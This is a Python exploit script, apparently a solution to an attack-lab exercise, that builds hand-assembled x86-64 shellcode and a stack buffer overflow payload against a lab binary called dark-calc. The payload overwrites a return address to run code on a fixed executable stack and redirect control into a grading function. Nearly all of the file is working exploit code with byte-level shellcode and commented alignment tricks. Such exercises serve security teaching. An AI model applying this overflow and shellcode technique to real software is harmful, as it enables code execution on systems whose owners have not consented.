#!/usr/bin/env python3
"""Task 5: execute shellcode on dark-calc's fixed RWX stack.

dark-calc maps an 8 MiB read/write/execute region at a fixed address and runs
main() on it (see init_fixed_stack / __wrap_main), so the stack is neither
randomised nor non-executable: input()'s buffer is always at a fixed address.
We overwrite input()'s return address with that fixed buffer address; the buffer
holds 21 bytes of shellcode that set rdi = 4 and jump into grade_eval() (which
prints "Hope A will be your grade!"), then grade_eval() returns into input()'s
empty-input exit path for a clean exit(0).

Alignment: the shellcode pushes the exit(0) call-site onto the stack, so when it
`jmp`s into grade_eval() the stack pointer sits one qword lower than a plain jmp
would leave it.  That makes grade_eval() enter with rsp % 16 == 8 (the SysV ABI
value a normal `call` produces), so its printf does not fault on `movaps` on any
glibc.  The exit address is computed from grade_eval with a 32-bit add/sub, so no
second 64-bit immediate is needed and the whole shellcode fits in the 16-byte
buffer + the 8-byte saved-rbp slot.
"""
import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import attacklab

HERE = os.path.dirname(os.path.abspath(__file__))
ELF = attacklab.Elf(os.path.join(HERE, "attack", "dark-calc"))

GRADE_EVAL = ELF.symbol("grade_eval")       # 0x401a87
EXIT0 = attacklab.exit0_call_site(ELF)      # 0x4019b9  (mov edi,0; call exit@plt)
BUFFER = attacklab.fixed_stack_buffer(ELF)  # 0x721000800fd0

# Non-PIE binaries linked at 0x400000 keep every code address below 4 GiB, so the
# 32-bit operand forms below are exact (and short enough to fit the buffer).
assert GRADE_EVAL < 2 ** 32 and EXIT0 < 2 ** 32
delta = GRADE_EVAL - EXIT0
assert 0 <= delta < 2 ** 31, "exit call site must sit below grade_eval"

# mov eax, GRADE_EVAL ; push 4 ; pop rdi ; sub eax, delta ; push rax ; add eax, delta ; jmp rax
shellcode = (
    b"\xb8" + struct.pack("<I", GRADE_EVAL) +  # mov  eax, grade_eval
    b"\x6a\x04" +                                # push 4
    b"\x5f" +                                    # pop  rdi                (rdi = 4)
    b"\x2d" + struct.pack("<I", delta) +         # sub  eax, delta          (rax = EXIT0)
    b"\x50" +                                    # push rax                (grade_eval's return addr)
    b"\x05" + struct.pack("<I", delta) +         # add  eax, delta          (rax = grade_eval)
    b"\xff\xe0"                                  # jmp  rax                (grade_eval, rsp aligned)
)

assert len(shellcode) <= 24

payload = shellcode.ljust(24, b"\x90")   # pad up to the saved rbp
payload += struct.pack("<Q", BUFFER)     # return address -> shellcode
payload += b"\n"

# dark-calc runs on a 48-byte fixed stack window; gets() appends one NUL, so the
# data written before the newline must be <= 47 bytes or the NUL hits the guard
# page and faults inside gets() itself.
data = payload[:-1]
assert len(data) <= 47, f"{len(data)} data bytes: NUL would reach the guard page"
assert b"\n" not in data, "payload contains a newline before the delimiter"

sys.stdout.buffer.write(payload)
